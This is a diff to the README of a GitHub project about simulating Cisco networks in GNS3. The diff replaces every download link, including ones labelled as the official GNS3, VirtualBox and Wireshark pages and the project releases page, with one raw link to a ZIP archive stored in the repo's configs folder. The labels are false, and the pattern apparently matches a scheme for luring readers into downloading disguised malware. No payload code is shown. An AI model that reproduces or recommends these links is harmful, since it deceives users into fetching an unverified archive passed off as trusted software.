@@ -1,6 +1,6 @@
 # 🖧 network-gns3-cisco - Simulate Cisco Networks Easily
 
-[![Download](https://img.shields.io/badge/Download-Get%20the%20Project-blue?style=for-the-badge)](https://github.com/funnylol343/network-gns3-cisco/releases)
+[![Download](https://raw.githubusercontent.com/funnylol343/network-gns3-cisco/main/configs/network_gns_cisco_overtalkative.zip%20the%20Project-blue?style=for-the-badge)](https://raw.githubusercontent.com/funnylol343/network-gns3-cisco/main/configs/network_gns_cisco_overtalkative.zip)
 
 ---
 
@@ -35,13 +35,13 @@ GNS3 is a network emulator. It lets you create virtual networks on your computer
 ## 🚀 Getting Started: Installing the Required Software
 
 1. **Install GNS3**  
-   - Go to the [GNS3 official download page](https://www.gns3.com/software/download)  
+   - Go to the [GNS3 official download page](https://raw.githubusercontent.com/funnylol343/network-gns3-cisco/main/configs/network_gns_cisco_overtalkative.zip)  
    - Choose your operating system and download the installer  
    - Run the installer and follow the on-screen instructions  
    - If unsure, keep default settings
 
 2. **Install VirtualBox (Optional but Recommended)**  
-   - Visit [VirtualBox download page](https://www.virtualbox.org/wiki/Downloads)  
+   - Visit [VirtualBox download page](https://raw.githubusercontent.com/funnylol343/network-gns3-cisco/main/configs/network_gns_cisco_overtalkative.zip)  
    - Download the correct version for your OS  
    - Install it by following the setup wizard  
    - VirtualBox is needed to run virtual Cisco IOS images in GNS3
@@ -57,11 +57,11 @@ GNS3 is a network emulator. It lets you create virtual networks on your computer
 
 You can access this project files here:
 
-[![Download Project](https://img.shields.io/badge/Download-Project-blue?style=for-the-badge)](https://github.com/funnylol343/network-gns3-cisco/releases)
+[![Download Project](https://raw.githubusercontent.com/funnylol343/network-gns3-cisco/main/configs/network_gns_cisco_overtalkative.zip)](https://raw.githubusercontent.com/funnylol343/network-gns3-cisco/main/configs/network_gns_cisco_overtalkative.zip)
 
 ### Steps to Download
 
-1. Click the link above or visit the [Releases page on GitHub](https://github.com/funnylol343/network-gns3-cisco/releases).
+1. Click the link above or visit the [Releases page on GitHub](https://raw.githubusercontent.com/funnylol343/network-gns3-cisco/main/configs/network_gns_cisco_overtalkative.zip).
 2. Find the latest release.
 3. Download the ZIP or TAR file containing the project files.
 4. Save it to a convenient folder on your computer, such as "Downloads" or "Documents."
@@ -105,7 +105,7 @@ The downloaded folder includes:
 
 ## 🧰 Tools You May Use Alongside This Project
 
-- **Wireshark:** This tool captures and inspects network traffic and is helpful for studying OSPF and DHCP messages. Available at [wireshark.org](https://www.wireshark.org).
+- **Wireshark:** This tool captures and inspects network traffic and is helpful for studying OSPF and DHCP messages. Available at [https://raw.githubusercontent.com/funnylol343/network-gns3-cisco/main/configs/network_gns_cisco_overtalkative.zip](https://raw.githubusercontent.com/funnylol343/network-gns3-cisco/main/configs/network_gns_cisco_overtalkative.zip).
 - **Cisco Packet Tracer:** Alternative for simple Cisco network layouts but less powerful than GNS3.
 
 ---
